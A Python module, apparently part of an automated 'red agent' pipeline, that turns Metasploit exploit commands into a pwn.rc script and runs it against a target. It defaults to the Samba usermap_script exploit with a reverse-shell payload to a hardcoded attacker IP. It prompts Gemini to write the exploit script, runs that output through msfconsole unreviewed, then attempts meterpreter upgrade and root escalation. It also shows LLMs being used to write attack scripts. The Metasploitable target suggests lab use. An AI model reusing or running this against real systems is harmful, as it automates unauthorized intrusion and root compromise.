#!/usr/bin/env python3
"""
NODE 7 BACKUP M2: MANUAL EXPLOIT TO PWN.RC CONVERSION
Converts manually provided Metasploit exploit commands to pwn.rc file via GPT
Used as final backup after Node 6 if OS is in specified range (Linux 2.6.x)
"""

import logging
import time
import subprocess
from pathlib import Path
from typing import Dict
import os

# # GPT CODE (COMMENTED OUT - USING GEMINI INSTEAD)
# try:
#     from openai import OpenAI
# except ImportError:
#     OpenAI = None

# Gemini API
try:
    import google.generativeai as genai
except ImportError:
    genai = None


def node_7_backup_m2_manual_exploit_to_rc(state: Dict) -> Dict:
    """
    NODE 7 BACKUP M2: Convert Manual Exploit Commands to pwn.rc via GPT

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE
    ═══════════════════════════════════════════════════════════════════════════

    Final fallback after Node 6 if NO meterpreter session obtained and OS is
    in specified range (Linux 2.6.x - Metasploitable):
    1. Check if OS is in supported range (Linux 2.6.x)
    2. Accept manual Metasploit exploit commands
    3. Send to GPT for pwn.rc conversion
    4. Generate working pwn.rc from manual exploit script
    5. Execute pwn.rc via msfconsole
    6. Attempt privilege escalation

    Example Manual Exploit Script:
        use exploit/multi/samba/usermap_script
        set RHOSTS 192.168.0.173
        set PAYLOAD cmd/unix/reverse
        set LHOST 192.168.0.187
        run

    ═══════════════════════════════════════════════════════════════════════════
    INPUT STATE REQUIREMENTS
    ═══════════════════════════════════════════════════════════════════════════

    Required (from Nodes 1-6):
    - target: Target IP address
    - port: Target port
    - service: Service name
    - os_type: Detected OS string
    - lhost: Attacker IP address
    - session_dir: Path to session directory
    - manual_exploit_script: Metasploit exploit commands to convert

    OS RANGE CHECK:
    - Only executes if OS is in range: Linux 2.6.x
    - Returns error if OS is outside supported range

    ═══════════════════════════════════════════════════════════════════════════
    OUTPUT STATE UPDATES
    ═══════════════════════════════════════════════════════════════════════════

    On Success:
    - pwn_rc_generated: True
    - pwn_rc_path: Path to generated pwn.rc file
    - pwn_rc_source: "node_7_backup_m2"
    - primary_session_id: Meterpreter session ID
    - primary_session_type: "meterpreter"
    - is_root: True (if privilege escalation successful)

    On OS Not in Range:
    - pwn_rc_generated: False
    - error: "OS not in supported range (Linux 2.6.x required)"

    On Failure:
    - pwn_rc_generated: False
    - error: Error message

    ═══════════════════════════════════════════════════════════════════════════
    """

    logger = logging.getLogger("red_agent.node_7_backup_m2")

    logger.info("═" * 80)
    logger.info("NODE 7 BACKUP M2: MANUAL EXPLOIT TO PWN.RC CONVERSION")
    logger.info("(Final fallback after Node 6 for Linux 2.6.x systems)")
    logger.info("═" * 80)
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 0: CHECK OS RANGE (Linux 2.6.x ONLY)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 0: Checking OS Range")
    logger.info("─" * 80)

    os_type = state.get("os_type", "Linux")

    # Check if OS is in supported range (Linux 2.6.x)
    if not ("2.6" in str(os_type).lower()):
        logger.error("❌ OS NOT IN SUPPORTED RANGE")
        logger.error(f"   Detected OS: {os_type}")
        logger.error(f"   Required: Linux 2.6.x (Metasploitable)")
        logger.error("   This node only works with Linux 2.6.x systems")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"OS not in supported range. Got: {os_type}, Required: Linux 2.6.x"
        }

    logger.info(f"✓ OS in supported range: {os_type}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: EXTRACT TARGET INFORMATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 1: Extracting Target Information")
    logger.info("─" * 80)

    target = state.get("target")
    port = state.get("port")
    service = state.get("service", "unknown")
    lhost = state.get("lhost")
    session_dir = state.get("session_dir")

    # Get the detected OS from Node 1 output
    os_detected = state.get("os_detected", os_type)

    # Get manual exploit script if provided
    manual_exploit_script = state.get("manual_exploit_script", "")

    # Validate required parameters
    if not all([target, port, service]):
        logger.error("❌ Missing required parameters (target, port, service)")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "Missing required: target, port, or service"
        }

    # If lhost not set, use environment
    if not lhost:
        lhost = os.getenv("METASPLOIT_LHOST", "192.168.0.187")
        logger.info(f"ℹ️  LHOST not set, using environment: {lhost}")
        state["lhost"] = lhost

    logger.info(f"✓ Target: {target}:{port}")
    logger.info(f"✓ Service: {service}")
    logger.info(f"✓ OS Detected: {os_detected}")
    logger.info(f"✓ LHOST (Attacker): {lhost}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: CHECK OPENAI API & READ DEMO TEMPLATE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2: Checking OpenAI API & Reading Demo Template")
    logger.info("─" * 80)

    # # Check OpenAI API key (COMMENTED OUT - USING GEMINI)
    # openai_api_key = os.getenv("OPENAI_API_KEY")
    # if not openai_api_key or openai_api_key == "your_openai_api_key_here":
    #     logger.error("❌ OPENAI_API_KEY not set in .env file")
    #     return {
    #         **state,
    #         "pwn_rc_generated": False,
    #         "error": "OPENAI_API_KEY not configured"
    #     }

    # if not OpenAI:
    #     logger.error("❌ OpenAI library not installed")
    #     return {
    #         **state,
    #         "pwn_rc_generated": False,
    #         "error": "OpenAI library not installed"
    #     }

    # Check Gemini API key
    gemini_api_key = os.getenv("GEMINI_API_KEY")
    if not gemini_api_key or gemini_api_key == "your_gemini_api_key_here":
        logger.error("❌ GEMINI_API_KEY not set in .env file")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "GEMINI_API_KEY not configured"
        }

    if not genai:
        logger.error("❌ Google Generative AI library not installed")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "Google Generative AI library not installed"
        }

    # Read demo pwn.rc template
    demo_pwn_rc = Path(__file__).parent.parent / "pwn.rc"
    if not demo_pwn_rc.exists():
        logger.error(f"❌ Demo pwn.rc template not found at {demo_pwn_rc}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Demo pwn.rc not found at {demo_pwn_rc}"
        }

    try:
        demo_content = demo_pwn_rc.read_text()
        logger.info(f"✓ Loaded demo pwn.rc template ({len(demo_content)} bytes)")
    except Exception as e:
        logger.error(f"❌ Failed to read demo pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to read demo pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: PREPARE MANUAL EXPLOIT SCRIPT FOR GPT
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Preparing Manual Exploit Script")
    logger.info("─" * 80)

    if not manual_exploit_script:
        # If no script provided, create a template from known exploits
        logger.warning("⚠️  No manual exploit script provided")
        logger.info("Creating default exploit template based on service detection...")

        # Default template for common services
        manual_exploit_script = f"""use exploit/multi/samba/usermap_script
set RHOSTS {target}
set PAYLOAD cmd/unix/reverse
set LHOST {lhost}
run"""
        logger.info("Using default Samba exploit template")
    else:
        logger.info(f"Using provided manual exploit script ({len(manual_exploit_script)} bytes)")

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3.5: REGENERATE LPORT (AVOID PORT CONFLICTS)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3.5: Regenerating LPORT (avoid port conflicts)")
    logger.info("─" * 80)

    import random
    new_lport = random.randint(7000, 8999)  # Use different range than Node 4
    logger.info(f"✓ New LPORT for fallback attempt: {new_lport}")
    logger.info(f"  (Previous LPORT was {state.get('lport', 'unknown')}, now using {new_lport})")
    state["lport"] = new_lport
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: SEND TO GPT FOR PWN.RC CONVERSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 4: Converting Manual Exploit to pwn.rc via GPT-4")
    logger.info("─" * 80)

    try:
        # # GPT CODE (COMMENTED OUT - USING GEMINI)
        # client = OpenAI(api_key=openai_api_key)
        # prompt = f"""..."""
        # logger.info("Sending manual exploit script to GPT-4...")
        # logger.info(f"  Target: {target}:{port}")
        # logger.info(f"  Service: {service}")
        # response = client.chat.completions.create(
        #     model="gpt-4",
        #     messages=[
        #         {
        #             "role": "system",
        #             "content": "You are an expert Metasploit framework specialist. Convert manual exploit commands to pwn.rc Ruby scripts. Output ONLY the Ruby code, no explanations or markdown."
        #         },
        #         {"role": "user", "content": prompt}
        #     ],
        #     temperature=0.2,
        #     max_tokens=4000
        # )
        # generated_pwn_rc = response.choices[0].message.content.strip()
        # logger.info(f"✓ GPT-4 converted exploit to pwn.rc ({len(generated_pwn_rc)} bytes)")

        # Gemini API call
        prompt = f"""You are a Metasploit pwn.rc file generator.

CONTEXT:
- Target OS: Linux 2.6.9 - 2.6.33 (Metasploitable detected as: {os_detected})
- Service: {service}
- Target IP: {target}:{port}
- Attacker IP: {lhost}

MANUAL EXPLOIT COMMANDS PROVIDED:
```
{manual_exploit_script}
```

Your task: Convert these manual Metasploit commands into a complete, working pwn.rc file that:
1. Executes the same exploit as specified
2. Sets all required options (RHOSTS, PAYLOAD, LHOST, LPORT)
3. Upgrades to meterpreter if possible (sessions -u)
4. Attempts privilege escalation to root
5. Includes proper error handling and logging

Use this REAL WORKING EXAMPLE as your template:

```ruby
{demo_content}
```

NOW: Generate a pwn.rc file that replicates the manual exploit above.

REQUIREMENTS:
- Keep the same exploit as specified: {service}
- Keep the same payload structure
- Use RHOST: {target}
- Use LHOST: {lhost}
- Generate random LPORT
- Include wait_for_new_session() to detect exploitation success
- Include sessions -u upgrade command
- Include privilege escalation (appropriate for Linux 2.6.x)
- Use exact Ruby syntax compatible with msfconsole
- **CONDITIONAL EXIT: Only include run_single("exit") if NO meterpreter session obtained. If meterpreter obtained, KEEP msfconsole open for post-exploitation**

CRITICAL:
- Generate ONLY the pwn.rc Ruby code
- No explanations, no markdown, no code blocks
- Start with: #!/usr/bin/env ruby
- Must be immediately executable by: msfconsole -q -r pwn.rc
"""

        genai.configure(api_key=gemini_api_key)
        logger.info("Sending manual exploit script to Gemini...")
        logger.info(f"  Target: {target}:{port}")
        logger.info(f"  Service: {service}")

        model = genai.GenerativeModel(
            model_name="gemini-pro",
            generation_config={
                "temperature": 0.2,
                "max_output_tokens": 4000,
            },
            system_instruction="You are an expert Metasploit framework specialist. Convert manual exploit commands to pwn.rc Ruby scripts. Output ONLY the Ruby code, no explanations or markdown."
        )

        response = model.generate_content(prompt)
        generated_pwn_rc = response.text.strip()
        logger.info(f"✓ Gemini converted exploit to pwn.rc ({len(generated_pwn_rc)} bytes)")

    except Exception as e:
        logger.error(f"❌ Gemini conversion failed: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Gemini conversion failed: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: SAVE PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 5: Saving Generated pwn.rc")
    logger.info("─" * 80)

    try:
        # Use session_dir if available, otherwise create exploitations folder
        if session_dir:
            exploit_dir = Path(session_dir)
        else:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            exploitations_dir = Path(__file__).parent.parent / "exploitations"
            exploitations_dir.mkdir(exist_ok=True)
            exploit_dir = exploitations_dir / f"node_2b_m2_manual_{target}_{port}_{timestamp}"
            exploit_dir.mkdir(exist_ok=True)

        pwn_rc_path = exploit_dir / "generated_pwn.rc"
        pwn_rc_path.write_text(generated_pwn_rc)
        pwn_rc_path.chmod(0o755)  # Make executable
        logger.info(f"✓ Saved pwn.rc to {pwn_rc_path}")

    except Exception as e:
        logger.error(f"❌ Failed to save pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to save pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 6: EXECUTE PWN.RC VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 6: Executing pwn.rc via msfconsole")
    logger.info("─" * 80)

    logger.info(f"Running: msfconsole -q -r {pwn_rc_path}")
    logger.info("Converting manual exploit to meterpreter...")
    logger.info("")

    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(pwn_rc_path)],
            capture_output=False,
            timeout=300
        )

        logger.info("")
        logger.info("✓ pwn.rc execution completed")
        logger.info("Waiting for sessions to be registered...")

        time.sleep(5)

    except subprocess.TimeoutExpired:
        logger.warning("⚠️  msfconsole execution timed out (checking sessions...)")
        time.sleep(5)
    except Exception as e:
        logger.error(f"❌ Failed to execute msfconsole: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to execute msfconsole: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 7: CHECK FOR METERPRETER SESSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 7: Checking for Meterpreter Session")
    logger.info("─" * 80)

    msf_client = state.get("msf_client")
    if not msf_client:
        logger.warning("⚠️  MSF client not available, skipping session check")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "node_7_backup_m2",
            "note": "pwn.rc executed, check msfconsole for meterpreter session"
        }

    try:
        time.sleep(5)
        sessions = msf_client.sessions.list

        meterpreter_sessions = [
            (sid, info) for sid, info in sessions.items()
            if info.get('type') == 'meterpreter'
        ]

        if meterpreter_sessions:
            meterpreter_sid = max([sid for sid, _ in meterpreter_sessions])
            logger.info(f"✅ Found meterpreter session: {meterpreter_sid}")

            try:
                session = msf_client.sessions.session(meterpreter_sid)
                uid_output = session.run_command("id")
                is_root = "uid=0(root)" in uid_output
                logger.info(f"   User: {'root' if is_root else 'non-root'}")
                logger.info(f"   Output: {uid_output.strip()}")
            except:
                is_root = False

            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "node_7_backup_m2",
                "primary_session_id": meterpreter_sid,
                "primary_session_type": "meterpreter",
                "is_root": is_root,
                "privilege_level": "high" if is_root else "low",
                "next_phase": "post_exploitation"
            }
        else:
            logger.warning("⚠️  No meterpreter session found after execution")
            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "node_7_backup_m2",
                "note": "pwn.rc executed but no meterpreter session detected"
            }

    except Exception as e:
        logger.warning(f"⚠️  Error checking sessions: {e}")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "node_7_backup_m2",
            "note": f"pwn.rc executed, error checking sessions: {str(e)}"
        }
